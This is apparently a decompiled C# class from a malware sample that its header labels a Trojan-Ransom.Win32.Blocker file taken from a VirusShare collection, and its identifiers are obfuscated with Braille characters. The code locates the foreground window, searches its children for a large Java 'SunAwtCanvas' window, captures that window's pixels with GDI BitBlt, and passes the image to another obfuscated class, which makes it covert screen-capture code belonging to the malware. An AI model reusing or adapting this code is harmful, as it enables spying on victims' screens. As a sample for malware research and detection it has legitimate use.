// Decompiled with JetBrains decompiler
// Type: JavaCPL.⠽⢍⠫⢂⢲⢄⣓⣚⢿⡟⠔⢄⢳⠚⢺⡎⣔⢡⣖⢸⠙⡵⠲⠻⢵⠽⡨⡩⠵⢹⣝⣏⠂⡌⣉⡔⡑⠍
// Assembly: server2, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 19D5080A-FA0F-46D9-BD17-6D0468AA5C47
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00009-msil\Trojan-Ransom.Win32.Blocker.ibcq-3014a92dc7f80c8665ccac3a413d78e4de960042622c06fcd05f14c9fe6d781b.exe

using System;
using System.Collections.Generic;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Text;

namespace JavaCPL
{
  public static class \u283D\u288D\u282B\u2882\u28B2\u2884\u28D3\u28DA\u28BF\u285F\u2814\u2884\u28B3\u281A\u28BA\u284E\u28D4\u28A1\u28D6\u28B8\u2819\u2875\u2832\u283B\u28B5\u283D\u2868\u2869\u2835\u28B9\u28DD\u28CF\u2802\u284C\u28C9\u2854\u2851\u280D
  {
    public static IntPtr \u2824\u2803\u28D5\u28D4\u28A8\u2808\u2803\u2810\u2877\u28C6\u28A8\u28BC\u2882\u28A6\u2810\u2839\u28A7\u285A\u28D0\u28AD\u2875\u281C\u2869\u28A5\u2806\u2862\u2825\u2881\u2866\u2830\u2865\u28DD\u28C6\u2850\u28B2\u28B5\u2824() => \u283D\u288D\u282B\u2882\u28B2\u2884\u28D3\u28DA\u28BF\u285F\u2814\u2884\u28B3\u281A\u28BA\u284E\u28D4\u28A1\u28D6\u28B8\u2819\u2875\u2832\u283B\u28B5\u283D\u2868\u2869\u2835\u28B9\u28DD\u28CF\u2802\u284C\u28C9\u2854\u2851\u280D.User32.GetForegroundWindow();

    public static bool \u2869\u2832\u28B2\u282D\u28D0\u2882\u286D\u28DC\u285A\u2828\u28D2\u2813\u2821\u28D9\u2861\u2840\u28BB\u2807\u2879\u2830\u28CD\u2846\u28C3\u2861\u2889\u2846\u2861\u28AB\u28D5\u2832\u28D4\u283A\u2815\u2826\u28D0\u289D\u28DB\u2848\u282B\u28C6\u2837\u2809\u2807\u28DC\u288F\u2853(
      IntPtr _param0,
      IntPtr _param1)
    {
      if (!(GCHandle.FromIntPtr(_param1).Target is List<IntPtr> target))
        throw new InvalidCastException("GCHandle Target could not be cast as List<IntPtr>");
      target.Add(_param0);
      return true;
    }

    public static IntPtr[] \u285E\u281E\u28B9\u28C1\u2824\u2872\u2855\u280E\u289C\u283B\u2856\u2825\u28A4\u28C7\u28C5\u280A\u2858\u282F\u2878\u2801\u284C\u2855\u289E\u283F\u2878\u288C\u2826\u2863\u2885\u2832\u2894\u289A\u2878\u28CE\u2866\u284A\u28A5\u286B\u282E\u289A\u281D\u2888\u28AE\u28AE\u2842\u2897\u28A3\u2854\u2870\u2890\u2855\u280A\u2856\u2861\u2874\u2809\u285F\u287A(
      IntPtr _param0)
    {
      List<IntPtr> numList = new List<IntPtr>();
      GCHandle gcHandle = GCHandle.Alloc((object) numList);
      try
      {
        \u283D\u288D\u282B\u2882\u28B2\u2884\u28D3\u28DA\u28BF\u285F\u2814\u2884\u28B3\u281A\u28BA\u284E\u28D4\u28A1\u28D6\u28B8\u2819\u2875\u2832\u283B\u28B5\u283D\u2868\u2869\u2835\u28B9\u28DD\u28CF\u2802\u284C\u28C9\u2854\u2851\u280D.EnumWindowsProc lpEnumFunc = new \u283D\u288D\u282B\u2882\u28B2\u2884\u28D3\u28DA\u28BF\u285F\u2814\u2884\u28B3\u281A\u28BA\u284E\u28D4\u28A1\u28D6\u28B8\u2819\u2875\u2832\u283B\u28B5\u283D\u2868\u2869\u2835\u28B9\u28DD\u28CF\u2802\u284C\u28C9\u2854\u2851\u280D.EnumWindowsProc(\u283D\u288D\u282B\u2882\u28B2\u2884\u28D3\u28DA\u28BF\u285F\u2814\u2884\u28B3\u281A\u28BA\u284E\u28D4\u28A1\u28D6\u28B8\u2819\u2875\u2832\u283B\u28B5\u283D\u2868\u2869\u2835\u28B9\u28DD\u28CF\u2802\u284C\u28C9\u2854\u2851\u280D.\u2869\u2832\u28B2\u282D\u28D0\u2882\u286D\u28DC\u285A\u2828\u28D2\u2813\u2821\u28D9\u2861\u2840\u28BB\u2807\u2879\u2830\u28CD\u2846\u28C3\u2861\u2889\u2846\u2861\u28AB\u28D5\u2832\u28D4\u283A\u2815\u2826\u28D0\u289D\u28DB\u2848\u282B\u28C6\u2837\u2809\u2807\u28DC\u288F\u2853);
        \u283D\u288D\u282B\u2882\u28B2\u2884\u28D3\u28DA\u28BF\u285F\u2814\u2884\u28B3\u281A\u28BA\u284E\u28D4\u28A1\u28D6\u28B8\u2819\u2875\u2832\u283B\u28B5\u283D\u2868\u2869\u2835\u28B9\u28DD\u28CF\u2802\u284C\u28C9\u2854\u2851\u280D.User32.EnumChildWindows(_param0, lpEnumFunc, GCHandle.ToIntPtr(gcHandle));
      }
      finally
      {
        if (gcHandle.IsAllocated)
          gcHandle.Free();
      }
      return numList.ToArray();
    }

    public static string \u281E\u2844\u2827\u2886\u2809\u28CD\u28D2\u28D5\u284B\u2868\u2808\u2879\u287E\u28B0\u2862\u286F\u287D\u2867\u288F\u2879\u28DF\u2874\u288C\u28DC\u2858\u2877\u285B\u2805\u288F\u2818(
      IntPtr _param0)
    {
      StringBuilder pszType = new StringBuilder();
      int windowClass = (int) \u283D\u288D\u282B\u2882\u28B2\u2884\u28D3\u28DA\u28BF\u285F\u2814\u2884\u28B3\u281A\u28BA\u284E\u28D4\u28A1\u28D6\u28B8\u2819\u2875\u2832\u283B\u28B5\u283D\u2868\u2869\u2835\u28B9\u28DD\u28CF\u2802\u284C\u28C9\u2854\u2851\u280D.User32.RealGetWindowClass(_param0, pszType, (uint) byte.MaxValue);
      return pszType.ToString();
    }

    public static string \u2844\u2898\u286C\u28DA\u2889\u287F\u2828\u2845\u2869\u28D2\u2896\u2856\u2894\u28C3\u289F\u2892\u285D\u28B8\u2896\u2867\u280C\u2853\u281C\u2829\u289F(
      IntPtr _param0)
    {
      bool flag = false;
      StringBuilder text = new StringBuilder((int) byte.MaxValue);
      while (flag)
      {
        try
        {
          \u283D\u288D\u282B\u2882\u28B2\u2884\u28D3\u28DA\u28BF\u285F\u2814\u2884\u28B3\u281A\u28BA\u284E\u28D4\u28A1\u28D6\u28B8\u2819\u2875\u2832\u283B\u28B5\u283D\u2868\u2869\u2835\u28B9\u28DD\u28CF\u2802\u284C\u28C9\u2854\u2851\u280D.User32.GetWindowText(_param0, text, text.Capacity);
        }
        catch (Exception ex)
        {
          flag = true;
        }
      }
      return text.ToString();
    }

    public static IntPtr \u2804\u286A\u284D\u2839\u282B\u2840\u286F\u2869\u28A2\u2829\u2855\u28BE\u282B\u28BC\u2837\u2891\u2826\u2849\u288F\u2877\u28A6\u288F\u2868\u28B6\u2815\u28D7\u284E\u2856\u2855\u2877\u285E\u2896\u28A7\u28C6\u287F\u280D\u2880\u2812\u2829\u28D2\u280C\u2878\u283E\u28A7\u2826\u2864\u280E\u284C\u2878()
    {
      IntPtr hwnd = \u283D\u288D\u282B\u2882\u28B2\u2884\u28D3\u28DA\u28BF\u285F\u2814\u2884\u28B3\u281A\u28BA\u284E\u28D4\u28A1\u28D6\u28B8\u2819\u2875\u2832\u283B\u28B5\u283D\u2868\u2869\u2835\u28B9\u28DD\u28CF\u2802\u284C\u28C9\u2854\u2851\u280D.\u288B\u2861\u2860\u280B\u28C7\u2854\u2801\u2877\u2824\u2834\u28D1\u2819\u2814\u282B\u28AA\u289E\u2817\u2845\u283D\u2829\u2810\u2813\u281F\u289D\u286A\u282D\u2850\u28A1\u288F\u2891\u28C8\u2802\u28BD\u285D\u28CB\u28DC\u2835\u289B\u28DE\u282A\u280C\u2808\u28CE\u28D5\u2800\u28D3\u2864\u2813\u28DD\u2867\u284D\u28A9\u280F\u284F\u28C7\u2878\u2842\u28A3\u2881\u289A\u2804\u283F(\u283D\u288D\u282B\u2882\u28B2\u2884\u28D3\u28DA\u28BF\u285F\u2814\u2884\u28B3\u281A\u28BA\u284E\u28D4\u28A1\u28D6\u28B8\u2819\u2875\u2832\u283B\u28B5\u283D\u2868\u2869\u2835\u28B9\u28DD\u28CF\u2802\u284C\u28C9\u2854\u2851\u280D.\u285E\u281E\u28B9\u28C1\u2824\u2872\u2855\u280E\u289C\u283B\u2856\u2825\u28A4\u28C7\u28C5\u280A\u2858\u282F\u2878\u2801\u284C\u2855\u289E\u283F\u2878\u288C\u2826\u2863\u2885\u2832\u2894\u289A\u2878\u28CE\u2866\u284A\u28A5\u286B\u282E\u289A\u281D\u2888\u28AE\u28AE\u2842\u2897\u28A3\u2854\u2870\u2890\u2855\u280A\u2856\u2861\u2874\u2809\u285F\u287A(\u283D\u288D\u282B\u2882\u28B2\u2884\u28D3\u28DA\u28BF\u285F\u2814\u2884\u28B3\u281A\u28BA\u284E\u28D4\u28A1\u28D6\u28B8\u2819\u2875\u2832\u283B\u28B5\u283D\u2868\u2869\u2835\u28B9\u28DD\u28CF\u2802\u284C\u28C9\u2854\u2851\u280D.\u2824\u2803\u28D5\u28D4\u28A8\u2808\u2803\u2810\u2877\u28C6\u28A8\u28BC\u2882\u28A6\u2810\u2839\u28A7\u285A\u28D0\u28AD\u2875\u281C\u2869\u28A5\u2806\u2862\u2825\u2881\u2866\u2830\u2865\u28DD\u28C6\u2850\u28B2\u28B5\u2824()), "SunAwtCanvas");
      \u283D\u288D\u282B\u2882\u28B2\u2884\u28D3\u28DA\u28BF\u285F\u2814\u2884\u28B3\u281A\u28BA\u284E\u28D4\u28A1\u28D6\u28B8\u2819\u2875\u2832\u283B\u28B5\u283D\u2868\u2869\u2835\u28B9\u28DD\u28CF\u2802\u284C\u28C9\u2854\u2851\u280D.RECT lpRect;
      \u283D\u288D\u282B\u2882\u28B2\u2884\u28D3\u28DA\u28BF\u285F\u2814\u2884\u28B3\u281A\u28BA\u284E\u28D4\u28A1\u28D6\u28B8\u2819\u2875\u2832\u283B\u28B5\u283D\u2868\u2869\u2835\u28B9\u28DD\u28CF\u2802\u284C\u28C9\u2854\u2851\u280D.User32.GetWindowRect(hwnd, out lpRect);
      int num1 = lpRect.right - lpRect.left;
      int num2 = lpRect.bottom - lpRect.top;
      return num1 > 700 && num2 > 500 ? hwnd : IntPtr.Zero;
    }

    public static IntPtr \u288B\u2861\u2860\u280B\u28C7\u2854\u2801\u2877\u2824\u2834\u28D1\u2819\u2814\u282B\u28AA\u289E\u2817\u2845\u283D\u2829\u2810\u2813\u281F\u289D\u286A\u282D\u2850\u28A1\u288F\u2891\u28C8\u2802\u28BD\u285D\u28CB\u28DC\u2835\u289B\u28DE\u282A\u280C\u2808\u28CE\u28D5\u2800\u28D3\u2864\u2813\u28DD\u2867\u284D\u28A9\u280F\u284F\u28C7\u2878\u2842\u28A3\u2881\u289A\u2804\u283F(
      IntPtr[] _param0,
      string _param1)
    {
      IntPtr zero = IntPtr.Zero;
      IntPtr num1 = IntPtr.Zero;
      foreach (IntPtr num2 in _param0)
      {
        if (num2 != IntPtr.Zero && \u283D\u288D\u282B\u2882\u28B2\u2884\u28D3\u28DA\u28BF\u285F\u2814\u2884\u28B3\u281A\u28BA\u284E\u28D4\u28A1\u28D6\u28B8\u2819\u2875\u2832\u283B\u28B5\u283D\u2868\u2869\u2835\u28B9\u28DD\u28CF\u2802\u284C\u28C9\u2854\u2851\u280D.\u281E\u2844\u2827\u2886\u2809\u28CD\u28D2\u28D5\u284B\u2868\u2808\u2879\u287E\u28B0\u2862\u286F\u287D\u2867\u288F\u2879\u28DF\u2874\u288C\u28DC\u2858\u2877\u285B\u2805\u288F\u2818(num2).Contains(_param1))
        {
          for (IntPtr index = new IntPtr(\u283D\u288D\u282B\u2882\u28B2\u2884\u28D3\u28DA\u28BF\u285F\u2814\u2884\u28B3\u281A\u28BA\u284E\u28D4\u28A1\u28D6\u28B8\u2819\u2875\u2832\u283B\u28B5\u283D\u2868\u2869\u2835\u28B9\u28DD\u28CF\u2802\u284C\u28C9\u2854\u2851\u280D.User32.GetWindow(num2.ToInt32(), \u283D\u288D\u282B\u2882\u28B2\u2884\u28D3\u28DA\u28BF\u285F\u2814\u2884\u28B3\u281A\u28BA\u284E\u28D4\u28A1\u28D6\u28B8\u2819\u2875\u2832\u283B\u28B5\u283D\u2868\u2869\u2835\u28B9\u28DD\u28CF\u2802\u284C\u28C9\u2854\u2851\u280D.GW.CHILD)); index != IntPtr.Zero; index = new IntPtr(\u283D\u288D\u282B\u2882\u28B2\u2884\u28D3\u28DA\u28BF\u285F\u2814\u2884\u28B3\u281A\u28BA\u284E\u28D4\u28A1\u28D6\u28B8\u2819\u2875\u2832\u283B\u28B5\u283D\u2868\u2869\u2835\u28B9\u28DD\u28CF\u2802\u284C\u28C9\u2854\u2851\u280D.User32.GetWindow(num1.ToInt32(), \u283D\u288D\u282B\u2882\u28B2\u2884\u28D3\u28DA\u28BF\u285F\u2814\u2884\u28B3\u281A\u28BA\u284E\u28D4\u28A1\u28D6\u28B8\u2819\u2875\u2832\u283B\u28B5\u283D\u2868\u2869\u2835\u28B9\u28DD\u28CF\u2802\u284C\u28C9\u2854\u2851\u280D.GW.CHILD)))
            num1 = index;
          \u283D\u288D\u282B\u2882\u28B2\u2884\u28D3\u28DA\u28BF\u285F\u2814\u2884\u28B3\u281A\u28BA\u284E\u28D4\u28A1\u28D6\u28B8\u2819\u2875\u2832\u283B\u28B5\u283D\u2868\u2869\u2835\u28B9\u28DD\u28CF\u2802\u284C\u28C9\u2854\u2851\u280D.\u281E\u2844\u2827\u2886\u2809\u28CD\u28D2\u28D5\u284B\u2868\u2808\u2879\u287E\u28B0\u2862\u286F\u287D\u2867\u288F\u2879\u28DF\u2874\u288C\u28DC\u2858\u2877\u285B\u2805\u288F\u2818(num1);
          if (\u283D\u288D\u282B\u2882\u28B2\u2884\u28D3\u28DA\u28BF\u285F\u2814\u2884\u28B3\u281A\u28BA\u284E\u28D4\u28A1\u28D6\u28B8\u2819\u2875\u2832\u283B\u28B5\u283D\u2868\u2869\u2835\u28B9\u28DD\u28CF\u2802\u284C\u28C9\u2854\u2851\u280D.\u2867\u287C\u2825\u2876\u28D4\u284E\u2880\u2858\u2822\u28A1\u283E\u28C6\u285B\u289F\u2857\u280B\u280F\u28C5\u285A\u281E\u282A\u28CA\u2852\u28CB\u280E\u2859\u2823\u28DC(num1))
            return num1;
        }
      }
      return IntPtr.Zero;
    }

    public static bool \u285B\u2814\u28CA\u288C\u28C8\u281C\u2807\u2891\u285E\u2810\u28C1\u28D7\u2889\u2877\u285B\u282A\u28D6\u283F\u2806\u2876\u28BB\u2870\u2805\u2870\u2869\u28CB\u2870\u286C\u2830\u2892\u286E() => \u283D\u288D\u282B\u2882\u28B2\u2884\u28D3\u28DA\u28BF\u285F\u2814\u2884\u28B3\u281A\u28BA\u284E\u28D4\u28A1\u28D6\u28B8\u2819\u2875\u2832\u283B\u28B5\u283D\u2868\u2869\u2835\u28B9\u28DD\u28CF\u2802\u284C\u28C9\u2854\u2851\u280D.\u2804\u286A\u284D\u2839\u282B\u2840\u286F\u2869\u28A2\u2829\u2855\u28BE\u282B\u28BC\u2837\u2891\u2826\u2849\u288F\u2877\u28A6\u288F\u2868\u28B6\u2815\u28D7\u284E\u2856\u2855\u2877\u285E\u2896\u28A7\u28C6\u287F\u280D\u2880\u2812\u2829\u28D2\u280C\u2878\u283E\u28A7\u2826\u2864\u280E\u284C\u2878() != IntPtr.Zero;

    public static bool \u2867\u287C\u2825\u2876\u28D4\u284E\u2880\u2858\u2822\u28A1\u283E\u28C6\u285B\u289F\u2857\u280B\u280F\u28C5\u285A\u281E\u282A\u28CA\u2852\u28CB\u280E\u2859\u2823\u28DC(
      IntPtr _param0)
    {
      \u283D\u288D\u282B\u2882\u28B2\u2884\u28D3\u28DA\u28BF\u285F\u2814\u2884\u28B3\u281A\u28BA\u284E\u28D4\u28A1\u28D6\u28B8\u2819\u2875\u2832\u283B\u28B5\u283D\u2868\u2869\u2835\u28B9\u28DD\u28CF\u2802\u284C\u28C9\u2854\u2851\u280D.RECT lpRect;
      \u283D\u288D\u282B\u2882\u28B2\u2884\u28D3\u28DA\u28BF\u285F\u2814\u2884\u28B3\u281A\u28BA\u284E\u28D4\u28A1\u28D6\u28B8\u2819\u2875\u2832\u283B\u28B5\u283D\u2868\u2869\u2835\u28B9\u28DD\u28CF\u2802\u284C\u28C9\u2854\u2851\u280D.User32.GetWindowRect(_param0, out lpRect);
      return lpRect.bottom - lpRect.top > 400;
    }

    public static Bitmap \u2899\u28CF\u2844\u2859\u2868\u2826\u281E\u2816\u2873\u2832\u28AC\u28D3\u28C2\u2817\u285C\u289B\u285D\u281C\u28C2\u28AC\u28B8\u289E\u28BB\u285C\u2879\u2829\u28AB\u2831\u289A\u2865\u28D0\u2858\u2806(
      Bitmap _param0,
      Rectangle _param1)
    {
      bool flag = false;
      Bitmap bitmap = new Bitmap(_param1.Width, _param1.Height);
      while (flag)
      {
        try
        {
          Graphics graphics = Graphics.FromImage((Image) bitmap);
          graphics.DrawImage((Image) _param0, 0, 0, _param1, GraphicsUnit.Pixel);
          graphics.Dispose();
        }
        catch (Exception ex)
        {
          flag = true;
        }
      }
      return bitmap;
    }

    public static Bitmap \u28B6\u289F\u284B\u281C\u28D7\u284F\u283E\u28D8\u2812\u2819\u28D2\u281B\u28C1\u289C\u2818\u281D\u286E\u285A\u2810\u281C\u284A\u289D\u28D4\u286C\u284E\u285E\u2891\u2853\u2814\u28D1\u285F\u2898\u2848\u2854(
      out Point _param0)
    {
      try
      {
        IntPtr hwnd = \u283D\u288D\u282B\u2882\u28B2\u2884\u28D3\u28DA\u28BF\u285F\u2814\u2884\u28B3\u281A\u28BA\u284E\u28D4\u28A1\u28D6\u28B8\u2819\u2875\u2832\u283B\u28B5\u283D\u2868\u2869\u2835\u28B9\u28DD\u28CF\u2802\u284C\u28C9\u2854\u2851\u280D.\u2804\u286A\u284D\u2839\u282B\u2840\u286F\u2869\u28A2\u2829\u2855\u28BE\u282B\u28BC\u2837\u2891\u2826\u2849\u288F\u2877\u28A6\u288F\u2868\u28B6\u2815\u28D7\u284E\u2856\u2855\u2877\u285E\u2896\u28A7\u28C6\u287F\u280D\u2880\u2812\u2829\u28D2\u280C\u2878\u283E\u28A7\u2826\u2864\u280E\u284C\u2878();
        \u283D\u288D\u282B\u2882\u28B2\u2884\u28D3\u28DA\u28BF\u285F\u2814\u2884\u28B3\u281A\u28BA\u284E\u28D4\u28A1\u28D6\u28B8\u2819\u2875\u2832\u283B\u28B5\u283D\u2868\u2869\u2835\u28B9\u28DD\u28CF\u2802\u284C\u28C9\u2854\u2851\u280D.RECT lpRect;
        \u283D\u288D\u282B\u2882\u28B2\u2884\u28D3\u28DA\u28BF\u285F\u2814\u2884\u28B3\u281A\u28BA\u284E\u28D4\u28A1\u28D6\u28B8\u2819\u2875\u2832\u283B\u28B5\u283D\u2868\u2869\u2835\u28B9\u28DD\u28CF\u2802\u284C\u28C9\u2854\u2851\u280D.User32.GetWindowRect(hwnd, out lpRect);
        _param0 = new Point(lpRect.left, lpRect.top);
        int nWidth = lpRect.right - lpRect.left;
        int nHeight = lpRect.bottom - lpRect.top;
        int windowDc = \u283D\u288D\u282B\u2882\u28B2\u2884\u28D3\u28DA\u28BF\u285F\u2814\u2884\u28B3\u281A\u28BA\u284E\u28D4\u28A1\u28D6\u28B8\u2819\u2875\u2832\u283B\u28B5\u283D\u2868\u2869\u2835\u28B9\u28DD\u28CF\u2802\u284C\u28C9\u2854\u2851\u280D.User32.GetWindowDC(hwnd.ToInt32());
        int compatibleDc = \u283D\u288D\u282B\u2882\u28B2\u2884\u28D3\u28DA\u28BF\u285F\u2814\u2884\u28B3\u281A\u28BA\u284E\u28D4\u28A1\u28D6\u28B8\u2819\u2875\u2832\u283B\u28B5\u283D\u2868\u2869\u2835\u28B9\u28DD\u28CF\u2802\u284C\u28C9\u2854\u2851\u280D.GDI32.CreateCompatibleDC(windowDc);
        int compatibleBitmap = \u283D\u288D\u282B\u2882\u28B2\u2884\u28D3\u28DA\u28BF\u285F\u2814\u2884\u28B3\u281A\u28BA\u284E\u28D4\u28A1\u28D6\u28B8\u2819\u2875\u2832\u283B\u28B5\u283D\u2868\u2869\u2835\u28B9\u28DD\u28CF\u2802\u284C\u28C9\u2854\u2851\u280D.GDI32.CreateCompatibleBitmap(windowDc, nWidth, nHeight);
        \u283D\u288D\u282B\u2882\u28B2\u2884\u28D3\u28DA\u28BF\u285F\u2814\u2884\u28B3\u281A\u28BA\u284E\u28D4\u28A1\u28D6\u28B8\u2819\u2875\u2832\u283B\u28B5\u283D\u2868\u2869\u2835\u28B9\u28DD\u28CF\u2802\u284C\u28C9\u2854\u2851\u280D.GDI32.SelectObject(compatibleDc, compatibleBitmap);
        \u283D\u288D\u282B\u2882\u28B2\u2884\u28D3\u28DA\u28BF\u285F\u2814\u2884\u28B3\u281A\u28BA\u284E\u28D4\u28A1\u28D6\u28B8\u2819\u2875\u2832\u283B\u28B5\u283D\u2868\u2869\u2835\u28B9\u28DD\u28CF\u2802\u284C\u28C9\u2854\u2851\u280D.GDI32.BitBlt(compatibleDc, 0, 0, nWidth, nHeight, windowDc, 0, 0, 13369376);
        Bitmap bitmap = new Bitmap((Image) Image.FromHbitmap(new IntPtr(compatibleBitmap)), Image.FromHbitmap(new IntPtr(compatibleBitmap)).Width, Image.FromHbitmap(new IntPtr(compatibleBitmap)).Height);
        \u283D\u288D\u282B\u2882\u28B2\u2884\u28D3\u28DA\u28BF\u285F\u2814\u2884\u28B3\u281A\u28BA\u284E\u28D4\u28A1\u28D6\u28B8\u2819\u2875\u2832\u283B\u28B5\u283D\u2868\u2869\u2835\u28B9\u28DD\u28CF\u2802\u284C\u28C9\u2854\u2851\u280D.\u2883\u288B\u28DC\u2835\u2874\u2809\u2882\u280D\u2889\u2851\u2897\u2866\u28BB\u287D\u286F\u28D8\u28A7\u2810\u287B\u282F\u283F\u2831\u283F\u2887\u28B0\u2838\u2815\u28B7\u2898\u2810\u281F\u2865\u28B5\u289C\u2899\u281A\u2839\u28D9\u2874\u2826\u280D\u2861\u289E(compatibleBitmap, windowDc, hwnd, compatibleDc);
        new \u284D\u2808\u281A\u28B9\u2863\u2884\u2847\u2840\u2850\u2879\u2804\u2841\u284D\u286C\u28C4\u2882\u282C\u285A\u2874\u28D6\u28CF\u2899\u2812\u2855\u284D\u28B9\u2863\u285A\u28A7\u281A\u282A\u2899\u2874\u2805\u283A\u2885\u2899\u2805\u280F\u28DD\u2829\u2864\u2862\u2884\u28AE\u289C\u2834\u283E\u28A7\u28AC\u28CD\u2807\u280A\u281D\u2803\u2893\u28D6\u28A5\u286C\u2889\u2821(bitmap).\u28B5\u287D\u28BF\u2867\u28CD\u28A0\u2818\u28B9\u2808\u2886\u28B8\u2890\u2858\u282F\u2834\u28B3\u281D\u28AF\u28DF\u2882\u28AF\u2821\u28DE\u28BB\u2882\u287D\u28AE\u2863\u283F\u289E\u2800\u2816\u2897\u2821\u2857\u2864\u28B7\u2807\u285F\u28C0\u289F\u28DA\u2894\u28A3\u28BA\u28CD\u284C\u28AF\u2895\u282C\u2822\u28BE\u28D3\u287F\u281B\u2894\u287E\u2804\u28C5\u2850();
        return bitmap;
      }
      catch (Exception ex)
      {
        _param0 = new Point();
        return (Bitmap) null;
      }
    }

    public static void \u2883\u288B\u28DC\u2835\u2874\u2809\u2882\u280D\u2889\u2851\u2897\u2866\u28BB\u287D\u286F\u28D8\u28A7\u2810\u287B\u282F\u283F\u2831\u283F\u2887\u28B0\u2838\u2815\u28B7\u2898\u2810\u281F\u2865\u28B5\u289C\u2899\u281A\u2839\u28D9\u2874\u2826\u280D\u2861\u289E(
      int _param0,
      int _param1,
      IntPtr _param2,
      int _param3)
    {
      \u283D\u288D\u282B\u2882\u28B2\u2884\u28D3\u28DA\u28BF\u285F\u2814\u2884\u28B3\u281A\u28BA\u284E\u28D4\u28A1\u28D6\u28B8\u2819\u2875\u2832\u283B\u28B5\u283D\u2868\u2869\u2835\u28B9\u28DD\u28CF\u2802\u284C\u28C9\u2854\u2851\u280D.User32.ReleaseDC(_param2.ToInt32(), _param1);
      \u283D\u288D\u282B\u2882\u28B2\u2884\u28D3\u28DA\u28BF\u285F\u2814\u2884\u28B3\u281A\u28BA\u284E\u28D4\u28A1\u28D6\u28B8\u2819\u2875\u2832\u283B\u28B5\u283D\u2868\u2869\u2835\u28B9\u28DD\u28CF\u2802\u284C\u28C9\u2854\u2851\u280D.GDI32.DeleteDC(_param3);
      \u283D\u288D\u282B\u2882\u28B2\u2884\u28D3\u28DA\u28BF\u285F\u2814\u2884\u28B3\u281A\u28BA\u284E\u28D4\u28A1\u28D6\u28B8\u2819\u2875\u2832\u283B\u28B5\u283D\u2868\u2869\u2835\u28B9\u28DD\u28CF\u2802\u284C\u28C9\u2854\u2851\u280D.GDI32.DeleteObject(_param0);
    }

    internal delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

    internal delegate bool EnumWindowProc(IntPtr hWnd, IntPtr parameter);

    private class GDI32
    {
      [DllImport("GDI32.dll")]
      public static extern bool BitBlt(
        int hdcDest,
        int nXDest,
        int nYDest,
        int nWidth,
        int nHeight,
        int hdcSrc,
        int nXSrc,
        int nYSrc,
        int dwRop);

      [DllImport("GDI32.dll")]
      public static extern int CreateCompatibleBitmap(int hdc, int nWidth, int nHeight);

      [DllImport("GDI32.dll")]
      public static extern int CreateCompatibleDC(int hdc);

      [DllImport("GDI32.dll")]
      public static extern bool DeleteDC(int hdc);

      [DllImport("GDI32.dll")]
      public static extern bool DeleteObject(int hObject);

      [DllImport("GDI32.dll")]
      public static extern int GetDeviceCaps(int hdc, int nIndex);

      [DllImport("GDI32.dll")]
      public static extern int SelectObject(int hdc, int hgdiobj);
    }

    private class User32
    {
      [DllImport("User32.dll")]
      public static extern IntPtr GetForegroundWindow();

      [DllImport("User32.dll")]
      public static extern int GetWindowDC(int hWnd);

      [DllImport("User32.dll")]
      public static extern int ReleaseDC(int hWnd, int hDC);

      [DllImport("user32.dll")]
      public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

      [DllImport("user32.dll")]
      public static extern int GetWindow(
        int hWnd,
        \u283D\u288D\u282B\u2882\u28B2\u2884\u28D3\u28DA\u28BF\u285F\u2814\u2884\u28B3\u281A\u28BA\u284E\u28D4\u28A1\u28D6\u28B8\u2819\u2875\u2832\u283B\u28B5\u283D\u2868\u2869\u2835\u28B9\u28DD\u28CF\u2802\u284C\u28C9\u2854\u2851\u280D.GW uCmd);

      [DllImport("user32.dll")]
      [return: MarshalAs(UnmanagedType.Bool)]
      public static extern bool EnumChildWindows(
        IntPtr hwndParent,
        \u283D\u288D\u282B\u2882\u28B2\u2884\u28D3\u28DA\u28BF\u285F\u2814\u2884\u28B3\u281A\u28BA\u284E\u28D4\u28A1\u28D6\u28B8\u2819\u2875\u2832\u283B\u28B5\u283D\u2868\u2869\u2835\u28B9\u28DD\u28CF\u2802\u284C\u28C9\u2854\u2851\u280D.EnumWindowsProc lpEnumFunc,
        IntPtr lParam);

      [DllImport("user32.dll")]
      [return: MarshalAs(UnmanagedType.Bool)]
      public static extern bool EnumWindows(
        \u283D\u288D\u282B\u2882\u28B2\u2884\u28D3\u28DA\u28BF\u285F\u2814\u2884\u28B3\u281A\u28BA\u284E\u28D4\u28A1\u28D6\u28B8\u2819\u2875\u2832\u283B\u28B5\u283D\u2868\u2869\u2835\u28B9\u28DD\u28CF\u2802\u284C\u28C9\u2854\u2851\u280D.EnumWindowsProc lpEnumFunc,
        IntPtr lParam);

      [DllImport("user32.dll")]
      public static extern uint RealGetWindowClass(
        IntPtr hwnd,
        [Out] StringBuilder pszType,
        uint cchType);

      [DllImport("user32.dll")]
      [return: MarshalAs(UnmanagedType.Bool)]
      public static extern bool GetWindowRect(
        IntPtr hwnd,
        out \u283D\u288D\u282B\u2882\u28B2\u2884\u28D3\u28DA\u28BF\u285F\u2814\u2884\u28B3\u281A\u28BA\u284E\u28D4\u28A1\u28D6\u28B8\u2819\u2875\u2832\u283B\u28B5\u283D\u2868\u2869\u2835\u28B9\u28DD\u28CF\u2802\u284C\u28C9\u2854\u2851\u280D.RECT lpRect);
    }

    public enum GW
    {
      HWNDFIRST,
      HWNDLAST,
      HWNDNEXT,
      HWNDPREV,
      OWNER,
      CHILD,
    }

    public struct RECT
    {
      public int left;
      public int top;
      public int right;
      public int bottom;
    }
  }
}
